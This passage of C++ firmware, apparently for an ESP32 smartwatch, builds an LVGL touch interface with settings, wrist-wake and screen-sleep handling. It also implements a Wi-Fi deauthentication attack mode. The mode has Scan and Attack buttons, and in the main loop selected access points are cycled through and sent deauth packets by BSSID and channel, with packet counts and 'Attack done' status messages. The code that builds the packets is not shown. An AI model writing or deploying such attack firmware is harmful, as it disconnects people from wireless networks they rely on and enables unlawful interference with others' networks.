    lv_obj_set_style_pad_all(settingPanel, 2, 0);
    lv_obj_set_flex_flow(settingPanel, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(settingPanel, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    addTouchBubble(settingPanel);
    const char *btnText[5] = {"Fld", "+", "-", "Save", "Exit"};
    const SettingAction btnAction[5] = {ACTION_FIELD_NEXT, ACTION_INC, ACTION_DEC, ACTION_SAVE, ACTION_EXIT};
    const int16_t btnW[5] = {42, 28, 28, 52, 52};
    for (uint8_t i = 0; i < 5; ++i) {
        lv_obj_t *btn = lv_btn_create(settingPanel);
        lv_obj_set_size(btn, btnW[i], 28);
        lv_obj_set_style_bg_color(btn, lv_color_hex(0x000000), 0);
        lv_obj_set_style_bg_opa(btn, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_color(btn, kUiGreen, 0);
        lv_obj_set_style_border_width(btn, 1, 0);
        lv_obj_set_style_shadow_width(btn, 0, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        lv_obj_add_event_cb(btn, setting_btn_event_cb, LV_EVENT_CLICKED, (void *)(uintptr_t)btnAction[i]);
        lv_obj_add_event_cb(btn, touch_event_cb, LV_EVENT_PRESSED, NULL);
        lv_obj_add_event_cb(btn, touch_event_cb, LV_EVENT_PRESSING, NULL);
        lv_obj_add_event_cb(btn, touch_event_cb, LV_EVENT_RELEASED, NULL);
        lv_obj_add_event_cb(btn, touch_event_cb, LV_EVENT_DOUBLE_CLICKED, NULL);
        addTouchBubble(btn);
        lv_obj_t *txt = lv_label_create(btn);
        lv_label_set_text(txt, btnText[i]);
        lv_obj_set_style_text_font(txt, kUiFont, 0);
        lv_obj_set_style_text_color(txt, kUiGreen, 0);
        lv_obj_center(txt);
        addTouchBubble(txt);
    }
    lv_obj_add_flag(settingPanel, LV_OBJ_FLAG_HIDDEN);

    // deauth panel - đơn giản
    deauthPanel = lv_obj_create(scr);
    lv_obj_set_size(deauthPanel, lv_pct(100), lv_pct(100));
    lv_obj_align(deauthPanel, LV_ALIGN_TOP_LEFT, 0, 0);
    lv_obj_set_style_bg_color(deauthPanel, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(deauthPanel, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(deauthPanel, 0, 0);
    lv_obj_set_style_pad_all(deauthPanel, 4, 0);
    lv_obj_set_flex_flow(deauthPanel, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(deauthPanel, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
    lv_obj_add_flag(deauthPanel, LV_OBJ_FLAG_HIDDEN);
    addTouchBubble(deauthPanel);

    deauthStatusLabel = lv_label_create(deauthPanel);
    lv_label_set_text(deauthStatusLabel, "Deauth mode. Scanning...");
    lv_obj_set_style_text_color(deauthStatusLabel, kUiGreen, 0);
    lv_obj_set_style_text_font(deauthStatusLabel, kUiFont, 0);
    lv_obj_set_width(deauthStatusLabel, lv_pct(100));
    lv_obj_set_style_text_align(deauthStatusLabel, LV_TEXT_ALIGN_CENTER, 0);

    deauthContainer = lv_obj_create(deauthPanel);
    lv_obj_set_size(deauthContainer, lv_pct(100), lv_pct(55));
    lv_obj_set_style_bg_color(deauthContainer, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(deauthContainer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(deauthContainer, 0, 0);
    lv_obj_set_style_pad_all(deauthContainer, 2, 0);
    lv_obj_set_flex_flow(deauthContainer, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scrollbar_mode(deauthContainer, LV_SCROLLBAR_MODE_ACTIVE);
    addTouchBubble(deauthContainer);

    // hàng nút chức năng
    lv_obj_t *btnRow = lv_obj_create(deauthPanel);
    lv_obj_set_width(btnRow, lv_pct(100));
    lv_obj_set_height(btnRow, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(btnRow, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(btnRow, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btnRow, 0, 0);
    lv_obj_set_style_pad_hor(btnRow, 4, 0);
    lv_obj_set_style_pad_ver(btnRow, 2, 0);
    lv_obj_set_style_pad_column(btnRow, 6, 0);
    lv_obj_set_flex_flow(btnRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btnRow, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    addTouchBubble(btnRow);

    const char *deauthBtnText[] = {"Scan", "Attack", "Exit"};
    int deauthBtnAction[] = {0, 1, 2};
    const int16_t deauthBtnH = 28;
    for (int i = 0; i < 3; i++) {
        lv_obj_t *btn = lv_btn_create(btnRow);
        lv_obj_set_height(btn, deauthBtnH);
        lv_obj_set_flex_grow(btn, 1);
        lv_obj_set_style_min_width(btn, 0, 0);
        lv_obj_set_style_pad_hor(btn, 2, 0);
        lv_obj_set_style_bg_color(btn, lv_color_hex(0x000000), 0);
        lv_obj_set_style_bg_opa(btn, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_color(btn, kUiGreen, 0);
        lv_obj_set_style_border_width(btn, 1, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        lv_obj_add_event_cb(btn, deauth_btn_event_cb, LV_EVENT_CLICKED, (void*)(uintptr_t)deauthBtnAction[i]);
        lv_obj_t *lbl = lv_label_create(btn);
        lv_label_set_text(lbl, deauthBtnText[i]);
        lv_obj_set_width(lbl, lv_pct(100));
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_DOT);
        lv_obj_set_style_text_align(lbl, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(lbl, kUiGreen, 0);
        lv_obj_set_style_text_font(lbl, kUiFont, 0);
        lv_obj_center(lbl);
        if (i == 0) scanButtonLabel = lbl;
        if (i == 1) attackButtonLabel = lbl;
        addTouchBubble(btn);
    }

    // sensor ready
    sensorReady = (instance.getDeviceProbe() & HW_BMA423_ONLINE);
    if (sensorReady) {
        int16_t rx, ry, rz;
        if (instance.sensor.getAccelerometer(rx, ry, rz)) {
            float ax = rx / 1024.0f, ay = ry / 1024.0f, az = rz / 1024.0f;
            float mag = sqrtf(ax*ax + ay*ay + az*az);
            if (mag > 0.20f) { lastAx = ax/mag; lastAy = ay/mag; lastAz = az/mag; }
        }
    } else if (!sensorWarned) {
        Serial.println("[WARN] BMA423 not detected, wrist wake disabled.");
        sensorWarned = true;
    }

    instance.setBrightness(DEVICE_MAX_BRIGHTNESS_LEVEL);
    screenOn = true;
    lastMotionMs = millis();

    refreshTime();
    updateSettingPanel();
    updateTimeDisplay();
    updateBatteryDisplay();
}

// ---------- loop ----------
void loop() {
    instance.loop();
    lv_timer_handler();

    uint32_t now = millis();

    if (deauthMode) {
        processWifiScan();
    }

    if (now - lastTickMs >= 1000) {
        lastTickMs = now;
        if (!deauthMode) {
            refreshTime();
            updateTimeDisplay();
        }
    }

    if (now - lastBatteryAnimMs >= 50) {
        updateBatteryDisplay();
    }

    if (!screenOn && detectWristRaise()) {
        wakeScreen();
    }

    if (attackInProgress && !stopAttackRequested && now >= attackNextPacketMs) {
        bool found = false;
        size_t chosenIndex = 0;
        for (size_t step = 0; step < apList.size(); ++step) {
            size_t idx = (attackCursor + step) % apList.size();
            if (apList[idx].selected) {
                chosenIndex = idx;
                attackCursor = (idx + 1) % apList.size();
                attackCurrentSelectedIndex = (attackCurrentSelectedIndex % attackSelectedCount) + 1;
                found = true;
                break;
            }
        }

        if (found) {
            const auto &ap = apList[chosenIndex];
            setAttackStatusMessage(ap, attackCurrentSelectedIndex, attackSelectedCount, attackPacketCount);
            lv_timer_handler();
            sendDeauthPacket(const_cast<uint8_t*>(ap.bssid), ap.channel);
            attackPacketCount++;
            attackNextPacketMs = now + packetSendDelayMs;
            yield();
        } else {
            attackInProgress = false;
            esp_wifi_set_promiscuous(false);
            setAttackButtonLabel("Attack");
            char buf[160];
            snprintf(buf, sizeof(buf), "Attack done\nTargets: %d\nPackets sent: %lu", attackSelectedCount, attackPacketCount);
            setStatusMessage(buf);
        }
    }

    if (stopAttackRequested) {
        attackInProgress = false;
        stopAttackRequested = false;
        esp_wifi_set_promiscuous(false);
        setAttackButtonLabel("Attack");
        char buf[160];
        snprintf(buf, sizeof(buf), "Attack stopped\nLast packets: %lu", attackPacketCount);
        setStatusMessage(buf);
    }

    if (!deauthMode && screenOn && (now - lastMotionMs > 10000)) {
        sleepScreen();
    }

    delay(10);
}